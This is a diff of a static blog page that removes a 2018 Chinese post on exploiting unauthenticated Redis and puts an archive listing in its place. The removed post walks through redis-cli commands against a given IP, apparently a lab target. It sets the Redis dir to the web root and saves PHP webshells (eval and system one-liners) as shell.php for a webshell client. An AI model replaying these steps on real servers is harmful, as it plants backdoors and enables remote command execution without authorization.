@@ -91,79 +91,20 @@
     <main class="main">
       <div class="content">
         
-  <article class="post">
-    <div class="post-title">
-      <h2 class="title">redis未授权访问</h2>
-       
-        <p>redis未授权访问</p>
-      
-    </div>
-     <div class="post-meta">
-      <span class="post-time">2018-10-15</span>
-    </div>
-    <div class="post-content">
-      <h4 id="方法一：【推荐】"><a href="#方法一：【推荐】" class="headerlink" title="方法一：【推荐】"></a><strong>方法一：【推荐】</strong></h4><pre><code>root@kali:~/redis-4.0.11# apt-get install redis
-root@kali:~# redis-cli 
-root@kali:~# redis-cli -h 219.153.49.228 -p 44483
-219.153.49.228:44483&gt; info
-</code></pre><p><img src="图片1.jpg" alt="tupian1 ">   //有问题</p>
-<pre><code>219.153.49.228:44483&gt; keys *
-(empty list or set)
-219.153.49.228:44483&gt; CONFIG SET dir /var/www/html/
-OK
-219.153.49.228:44483&gt; set shell &quot;&lt;?php @eval($_POST[&apos;margin&apos;]);?&gt;&quot;
-OK
-219.153.49.228:44483&gt; CONFIG SET dbfilename shell.php
-OK
-219.153.49.228:44483&gt; save
-OK
-</code></pre><h6 id="菜刀连接http-219-153-49-228-46421-shell-php"><a href="#菜刀连接http-219-153-49-228-46421-shell-php" class="headerlink" title="菜刀连接http://219.153.49.228:46421/shell.php"></a>菜刀连接<a href="http://219.153.49.228:46421/shell.php" target="_blank" rel="noopener">http://219.153.49.228:46421/shell.php</a></h6><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a><strong>方法二</strong></h4><blockquote>
-<h5 id="ip-219-153-49-228"><a href="#ip-219-153-49-228" class="headerlink" title="ip:219.153.49.228"></a>ip:219.153.49.228</h5></blockquote>
-<h5 id="1-一个界面安装运行"><a href="#1-一个界面安装运行" class="headerlink" title="1.一个界面安装运行"></a>1.一个界面安装运行</h5><pre><code>$ wget http://download.redis.io/releases/redis-4.0.11.tar.gz
-$ tar xzf redis-4.0.11.tar.gz
-$ cd redis-4.0.11
-$ make
-$ src/redis-server
-$ src/redis-cli
-redis&gt; set foo bar
-OK
-redis&gt; get foo
-&quot;bar&quot;
-</code></pre><h5 id="2-另开一个页面连接"><a href="#2-另开一个页面连接" class="headerlink" title="2.另开一个页面连接"></a>2.另开一个页面连接</h5><pre><code>root@kali:~/redis-4.0.11# cd redis-4.0.11
-root@kali:~/redis-4.0.11# src/redis-cli -h 219.153.49.228 -p 49053//web
-root@kali:~/redis-4.0.11# src/redis-cli -h 219.153.49.228 -p 42267
-219.153.49.228:42267&gt; info
-219.153.49.228:42267&gt; CONFIG SET dir /var/www/html/
-OK
-219.153.49.228:42267&gt; set shell &quot;&lt;?php echo system($_REQUEST[cmd])?&gt;&quot;
-OK
-219.153.49.228:42267&gt; CONFIG SET dbfilename shell.php
-OK
-219.153.49.228:42267&gt; save
-OK
-</code></pre><p>菜刀连接：<a href="http://219.153.49.228:49053/shell.php" target="_blank" rel="noopener">http://219.153.49.228:49053/shell.php</a></p>
-
-    </div>
-  </article>
-  <div class="post-nav">
-    <div class="post-nav-next post-nav-item">
-      
-        <a href="/2018/10/15/rsync未授权访问/" rel="next" title="rsync未授权访问">
-          <i class="fa fa-chevron-left"></i> rsync未授权访问
-        </a>
-      
-    </div>
-
-    <span class="post-nav-divider"></span>
-
-    <div class="post-nav-prev post-nav-item">
+<div class="archive">
+  
+  
     
-        <a href="/2018/10/16/常用工具命令/" rel="prev" title="常用工具命令">
-          常用工具命令 <i class="fa fa-chevron-right"></i>
-        </a>
+    
+      <h2 class="year">2018</h2>
       
+    
+    <div class="archive_item">
+      <span class="date">10-16</span>
+      <a class="title" href="/2018/10/16/常用工具命令/">常用工具命令</a>
     </div>
-  </div>
+  
+</div>
 
 
 
